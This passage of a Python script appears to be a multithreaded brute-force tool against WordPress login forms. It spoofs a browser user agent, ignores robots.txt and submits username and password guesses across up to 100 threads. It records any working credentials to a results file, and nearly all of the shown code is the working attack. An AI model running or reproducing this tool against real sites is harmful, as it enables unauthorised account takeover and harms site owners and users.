    br1.set_handle_robots(False)
    br1.addheaders = [('user-agent', '   Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.2.3) Gecko/20100423 Ubuntu/10.04 (lucid) Firefox/3.6.3')]
    br1.open(url)
    br1.select_form(nr=0)
    oskhar='wait'
    br1.form["log"] = z
    br1.form["pwd"] = w1
    sub= br1.submit()
    if str(sub.geturl())==inurl:
        print ('[96mCheck Password ><[92m ','[ ',w1,' ]')
        x1()
    else:
        print ('[96mCheck Password ><[92m ','[ ',w1,' ]')
        print ("[92mSuccess")
        print ("username = ", z)
        print ("Password = ", w1)
        c1=open("hasil.txt","w")
        l1=open("hasil.txt","a")
        c1.write("")
        l1.write(z+" <=> "+w1)
        oskhar="success"
    if oskhar=="success":
        sys.exit()

th1=threading.Thread(target=x1)
th2=threading.Thread(target=x2)
th3=threading.Thread(target=x3)
th4=threading.Thread(target=x4)
th5=threading.Thread(target=x5)
th6=threading.Thread(target=x6)
th7=threading.Thread(target=x7)
th8=threading.Thread(target=x8)
th9=threading.Thread(target=x9)
th10=threading.Thread(target=x10)
th11=threading.Thread(target=x11)
th12=threading.Thread(target=x12)
th13=threading.Thread(target=x13)
th14=threading.Thread(target=x14)
th15=threading.Thread(target=x15)
th16=threading.Thread(target=x16)
th17=threading.Thread(target=x17)
th18=threading.Thread(target=x18)
th19=threading.Thread(target=x19)
th20=threading.Thread(target=x20)
th21=threading.Thread(target=x21)
th22=threading.Thread(target=x22)
th23=threading.Thread(target=x23)
th24=threading.Thread(target=x24)
th25=threading.Thread(target=x25)
th26=threading.Thread(target=x26)
th27=threading.Thread(target=x27)
th28=threading.Thread(target=x28)
th29=threading.Thread(target=x29)
th30=threading.Thread(target=x30)
th31=threading.Thread(target=x31)
th32=threading.Thread(target=x32)
th33=threading.Thread(target=x33)
th34=threading.Thread(target=x34)
th35=threading.Thread(target=x35)
th36=threading.Thread(target=x36)
th37=threading.Thread(target=x37)
th38=threading.Thread(target=x38)
th39=threading.Thread(target=x39)
th40=threading.Thread(target=x40)
th41=threading.Thread(target=x41)
th42=threading.Thread(target=x42)
th43=threading.Thread(target=x43)
th44=threading.Thread(target=x44)
th45=threading.Thread(target=x45)
th46=threading.Thread(target=x46)
th47=threading.Thread(target=x47)
th48=threading.Thread(target=x48)
th49=threading.Thread(target=x49)
th50=threading.Thread(target=x50)
th51=threading.Thread(target=x51)
th52=threading.Thread(target=x52)
th53=threading.Thread(target=x53)
th54=threading.Thread(target=x54)
th55=threading.Thread(target=x55)
th56=threading.Thread(target=x56)
th57=threading.Thread(target=x57)
th58=threading.Thread(target=x58)
th59=threading.Thread(target=x59)
th60=threading.Thread(target=x60)
th61=threading.Thread(target=x61)
th62=threading.Thread(target=x62)
th63=threading.Thread(target=x63)
th64=threading.Thread(target=x64)
th65=threading.Thread(target=x65)
th66=threading.Thread(target=x66)
th67=threading.Thread(target=x67)
th68=threading.Thread(target=x68)
th69=threading.Thread(target=x69)
th70=threading.Thread(target=x70)
th71=threading.Thread(target=x71)
th72=threading.Thread(target=x72)
th73=threading.Thread(target=x73)
th74=threading.Thread(target=x74)
th75=threading.Thread(target=x75)
th76=threading.Thread(target=x76)
th77=threading.Thread(target=x77)
th78=threading.Thread(target=x78)
th79=threading.Thread(target=x79)
th80=threading.Thread(target=x80)
th81=threading.Thread(target=x81)
th82=threading.Thread(target=x82)
th83=threading.Thread(target=x83)
th84=threading.Thread(target=x84)
th85=threading.Thread(target=x85)
th86=threading.Thread(target=x86)
th87=threading.Thread(target=x87)
th88=threading.Thread(target=x88)
th89=threading.Thread(target=x89)
th90=threading.Thread(target=x90)
th91=threading.Thread(target=x91)
th92=threading.Thread(target=x92)
th93=threading.Thread(target=x93)
th94=threading.Thread(target=x94)
th95=threading.Thread(target=x95)
th96=threading.Thread(target=x96)
th97=threading.Thread(target=x97)
th98=threading.Thread(target=x98)
th99=threading.Thread(target=x99)
th100=threading.Thread(target=x100)


def start1():
    th1.start();th2.start();th3.start();th4.start();th5.start();th6.start();th7.start();th8.start();th9.start();th10.start()


def start2():
    th1.start();th2.start();th3.start();th4.start();th5.start();th6.start();th7.start();th8.start();th9.start();th10.start();th11.start();th12.start();th13.start();th14.start();th15.start();th16.start();th17.start();th18.start();th19.start();th20.start();th21.start();th22.start();th23.start();th24.start();th25.start();th26.start();th27.start();th28.start();th29.start();th30.start();th31.start();th32.start();th33.start();th34.start();th35.start();th36.start();th37.start();th38.start();th39.start();th40.start();th41.start();th42.start();th43.start();th44.start();th45.start();th46.start();th47.start();th48.start();th49.start();th50.start();th51.start();th52.start();th53.start();th54.start();th55.start();th56.start();th57.start();th58.start();th59.start();th60.start();th61.start();th62.start();th63.start();th64.start();th65.start();th66.start();th67.start();th68.start();th69.start();th70.start();th71.start();th72.start();th73.start();th74.start();th75.start();th76.start();th77.start();th78.start();th79.start();th80.start();th81.start();th82.start();th83.start();th84.start();th85.start();th86.start();th87.start();th88.start();th89.start();th90.start();th91.start();th92.start();th93.start();th94.start();th95.start();th96.start();th97.start();th98.start();th99.start();th100.start();

